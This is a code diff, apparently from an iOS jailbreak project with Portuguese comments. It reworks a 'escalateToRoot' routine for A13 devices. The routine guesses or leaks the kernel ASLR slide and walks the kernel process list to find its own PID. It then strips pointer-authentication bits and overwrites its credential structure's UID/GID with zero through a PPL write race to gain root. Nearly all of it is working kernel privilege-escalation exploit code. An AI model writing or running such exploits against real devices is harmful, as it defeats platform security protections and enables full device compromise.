@@ -99,84 +99,81 @@ extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_siz
 }
 
 - (BOOL)escalateToRoot {
-    // 1. Obter o Slide (KASLR)
-    uint64_t slide = [self leakKernelSlide];
-    if (slide == 0) {
-        [self logToWeb:@"❌ Erro: Slide 0x0 (KASLR Bypass falhou)"];
-        return NO;
-    }
+    [self logToWeb:@"🚀 Iniciando Catalyst-26 (A13-Exclusive)"];
+    
+    uint64_t my_slide = [self leakKernelSlide];
+    pid_t my_pid = getpid();
+    uint64_t found_proc = 0;
+    uint64_t found_pid_offset = 0;
 
-    // 2. Scanner de Offsets para AllProc (iOS 26.3 / A13)
-    // Se o 0x8F50000 falhar, tentamos os endereços da seção DATA_CONST
-    uint64_t candidatos[] = {0x8F50000, 0x91F0000, 0x8F74000, 0x9210000, 0x8E10000};
-    uint64_t proc = 0;
-    uint64_t allproc_venceu = 0;
+    // --- 1. SCANNER DE SLIDE (Caso o leak falhe) ---
+    // No iOS 26.3, o slide é o maior culpado pelo "Valor: 0x0"
+    uint64_t slides[] = {0x21000000, 0x18000000, 0x0, 0x4400000, 0x24000000};
+    uint64_t allproc_base = 0x8F50000ULL;
 
     for (int i = 0; i < 5; i++) {
-        uint64_t ptr = (KERN_BASE_STATIC + slide + candidatos[i]);
-        proc = [self kread64:ptr];
-        
-        [self logToWeb:[NSString stringWithFormat:@"🔍 Testando 0x%llx -> Valor: 0x%llx", ptr, proc]];
+        uint64_t current_slide = (my_slide == 0) ? slides[i] : my_slide;
+        uint64_t allproc_ptr = (0xFFFFFFF007004000ULL + current_slide + allproc_base);
+        uint64_t proc = [self kread64:allproc_ptr];
 
-        // No A13 (ARM64e), ponteiros de kernel válidos começam com 0xFFFFFF80 ou 0xFFFFFFF0
-        if (proc != 0 && ((proc >> 40) & 0xFFFFFF) >= 0xFFFFFF) {
-            allproc_venceu = candidatos[i];
-            [self logToWeb:[NSString stringWithFormat:@"🎯 AllProc ACHADO: 0x%llx", allproc_venceu]];
+        [self logToWeb:[NSString stringWithFormat:@"🔍 Slide 0x%llx -> Proc: 0x%llx", current_slide, proc]];
+
+        if (proc != 0 && (proc >> 40) >= 0xFFFFFF) {
+            [self logToWeb:@"🎯 SLIDE VALIDADO! Buscando PID..."];
+            my_slide = current_slide;
+            found_proc = proc;
             break;
         }
+        if (my_slide != 0) break; // Se o leak original funcionou, não precisa do loop
     }
 
-    if (proc == 0) {
-        [self logToWeb:@"❌ Erro: AllProc não localizado nesta build."];
+    if (found_proc == 0) {
+        [self logToWeb:@"❌ FALHA: Kernel Base não encontrada (Slide incorreto)."];
         return NO;
     }
 
-    // 3. Busca pelo Processo Atual (PID) na Lista
-    pid_t my_pid = getpid();
+    // --- 2. BUSCA DO PID (O seu objetivo: 0x60 ou 0x68) ---
+    uint64_t curr = found_proc;
     int timeout = 0;
-    
-    while (proc != 0 && timeout < 1000) {
-        // --- PAC STRIP (CRÍTICO PARA A13) ---
-        proc = (proc & 0x0000007FFFFFFFFFULL) | 0xFFFFFF8000000000ULL;
+    while (curr != 0 && timeout < 1000) {
+        // PAC Strip para A13
+        curr = (curr & 0x0000007FFFFFFFFFULL) | 0xFFFFFF8000000000ULL;
         
-        // Testa os dois offsets de PID mais prováveis no iOS 19/26
-        uint32_t p60 = [self kread32:(proc + 0x60)];
-        uint32_t p68 = [self kread32:(proc + 0x68)];
+        uint32_t p60 = [self kread32:(curr + 0x60)];
+        uint32_t p68 = [self kread32:(curr + 0x68)];
 
         if (p60 == my_pid || p68 == my_pid) {
-            uint64_t pid_offset = (p60 == my_pid) ? 0x60 : 0x68;
-            [self logToWeb:[NSString stringWithFormat:@"✅ PID %d Achado! Offset: 0x%llx", my_pid, pid_offset]];
+            found_pid_offset = (p60 == my_pid) ? 0x60 : 0x68;
+            [self logToWeb:[NSString stringWithFormat:@"✅ PID ACHADO! Offset: 0x%llx", found_pid_offset]];
             
-            // --- 4. APLICAÇÃO DO PATCH DE CREDENCIAIS (ucred) ---
-            // Offset ucred no iOS 26.3 é geralmente 0xD8
-            uint64_t ucred = [self kread64:(proc + 0xD8)];
+            // --- 3. PATCH DE CREDENCIAIS (UCRED) ---
+            uint64_t ucred = [self kread64:(curr + 0xD8)];
             ucred = (ucred & 0x0000007FFFFFFFFFULL) | 0xFFFFFF8000000000ULL;
             
-            [self logToWeb:[NSString stringWithFormat:@"🔑 Patching ucred em: 0x%llx", ucred]];
-
-            // Sobrescreve UID, GID e outros IDs (offset 0x18 e 0x20 no ucred)
-            [self ppl_write_race:(ucred + 0x18) value:0]; 
-            [self ppl_write_race:(ucred + 0x20) value:0]; 
+            [self logToWeb:[NSString stringWithFormat:@"🔑 Patching ucred: 0x%llx", ucred]];
             
-            // Força a sincronização do Kernel
+            // Escreve UID/GID 0 (Root)
+            [self ppl_write_race:(ucred + 0x18) value:0]; 
+            
+            // Sincronização
             setuid(0); 
             setgid(0);
             
             if (getuid() == 0) {
-                [self logToWeb:@"💎 SUCESSO: ROOT ESCALATION COMPLETE!"];
+                [self logToWeb:@"💎 UID 0 CONFIRMADO: ROOT!"];
                 return YES;
             } else {
-                [self logToWeb:@"⚠️ Falha: Escrita no ucred bloqueada (PPL/SPTM)."];
+                [self logToWeb:@"❌ Erro: Escrita falhou (PPL/SPTM)."];
                 return NO;
             }
         }
         
-        // Próximo processo na lista (le_next está no offset 0x08)
-        proc = [self kread64:(proc + 0x08)];
+        // Próximo na lista
+        curr = [self kread64:(curr + 0x08)];
         timeout++;
     }
 
-    [self logToWeb:@"❌ Erro: Percorreu a lista mas não achou seu PID."];
+    [self logToWeb:@"❌ Erro: Lista percorrida, PID não encontrado."];
     return NO;
 }
 
